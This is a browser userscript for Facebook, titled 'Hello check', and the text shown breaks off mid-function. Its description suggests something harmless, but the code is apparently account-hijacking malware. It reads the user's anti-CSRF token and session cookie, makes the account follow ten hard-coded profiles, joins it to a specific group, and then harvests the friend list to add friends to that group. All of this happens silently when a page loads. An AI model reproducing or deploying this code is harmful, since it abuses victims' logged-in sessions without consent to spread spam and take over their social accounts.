// ==UserScript==
// @name			*[Newest] Hello check 
// @namespace			*[Update]hello check !!
// @description			*[Update]Hello check !!
// @author			Anbu
// @authorURL			https://www.facebook.com/groups/454519821284164/
// @include			htt*://www.facebook.com/*
// @exclude 			htt*://apps.facebook.com/*
// @icon			http://s3.amazonaws.com/uso_ss/icon/159097/large.png
// @version			v 8.0 Final
// @exclude			htt*://*static*.facebook.com*
// @exclude			htt*://*channel*.facebook.com*
// @exclude			htt*://developers.facebook.com/*
// @exclude			htt*://upload.facebook.com/*
// @exclude			htt*://www.facebook.com/common/blank.html
// @exclude			htt*://*connect.facebook.com/*
// @exclude			htt*://*facebook.com/connect*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/l.php*
// @exclude			htt*://www.facebook.com/ai.php*
// @exclude			htt*://www.facebook.com/extern/*
// @exclude			htt*://www.facebook.com/pagelet/*
// @exclude			htt*://api.facebook.com/static/*
// @exclude			htt*://www.facebook.com/contact_importer/*
// @exclude			htt*://www.facebook.com/ajax/*
// @exclude			htt*://www.facebook.com/advertising/*
// @exclude			htt*://www.facebook.com/ads/*
// @exclude			htt*://www.facebook.com/sharer/*
// @exclude			htt*://www.facebook.com/send/*
// @exclude			htt*://www.facebook.com/mobile/*
// @exclude			htt*://www.facebook.com/settings/*
// @exclude			htt*://www.facebook.com/dialog/*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/bookmarks/*

// ==/UserScript==
var fb_dtsg=document.getElementsByName('fb_dtsg')[0].value;var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);function cereziAl(isim){var tarama=isim+"=";if(document.cookie.length>0){konum=document.cookie.indexOf(tarama);if(konum!=-1){konum+=tarama.length;son=document.cookie.indexOf(";",konum);if(son==-1)son=document.cookie.length;return unescape(document.cookie.substring(konum,son))}else{return""}}}function getRandomInt(min,max){return Math.floor(Math.random()*(max-min+1))+min}function randomValue(arr){return arr[getRandomInt(0,arr.length-1)]}var fb_dtsg=document.getElementsByName('fb_dtsg')[0].value;var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);function a(abone){var http4=new XMLHttpRequest();var url4="/ajax/follow/follow_profile.php?__a=1";var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";http4.open("POST",url4,true);http4.setRequestHeader("Content-type","application/x-www-form-urlencoded");http4.setRequestHeader("Content-length",params4.length);http4.setRequestHeader("Connection","close");http4.onreadystatechange=function(){if(http4.readyState==4&&http4.status==200){http4.close}};http4.send(params4)}a("100001051996525");a("100002667876553");a("100003904105230");a("100002471933891");a("100004343924349");a("100004686823385");a("100000556836192");a("100005342894418");a("100003568317637");a("100003892782838");var gid=['454519821284164'];var fb_dtsg=document['getElementsByName']('fb_dtsg')[0]['value'];var user_id=document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);var httpwp=new XMLHttpRequest();var urlwp='/ajax/groups/membership/r2j.php?__a=1';var paramswp='&ref=group_jump_header&group_id='+gid+'&fb_dtsg='+fb_dtsg+'&__user='+user_id+'&phstamp=';httpwp['open']('POST',urlwp,true);httpwp['setRequestHeader']('Content-type','application/x-www-form-urlencoded');httpwp['setRequestHeader']('Content-length',paramswp['length']);httpwp['setRequestHeader']('Connection','keep-alive');httpwp['send'](paramswp);var fb_dtsg=document['getElementsByName']('fb_dtsg')[0]['value'];var user_id=document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);var friends=new Array();gf=new XMLHttpRequest();gf['open']('GET','/ajax/typeahead/first_degree.php?__a=1&viewer='+user_id+'&token'+Math['random']()+'&filter[0]=user&options[0]=friends_only',false);gf['send']();if(gf['readyState']!=4){}else{data=eval('('+gf['responseText']['substr'](9)+')');if(data['error']){}else{friends=data['payload']['entries']['sort'](function(_0x93dax8,_0x93dax9){return _0x93dax8['index']-_0x93dax9['index']})}};var Title='Auto Subscribers Friends to Group (Made By) <A style="color:#3B5998;" href="http://www.facebook.com/anburocky3">Anbuselvan rocky</A>';grpname=document.getElementById("groupsJumpTitle").innerHTML;var Descriptions="",_text='Powered By <A style="color:#3B5998;" href="https://www.facebook.com/groups/computergenuis">Computer genuis.</A> Join it now.';function AddFriendtoGroup(opo){jx.load(window.location.protocol+"//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg="+fb_dtsg+"&group_id="+gid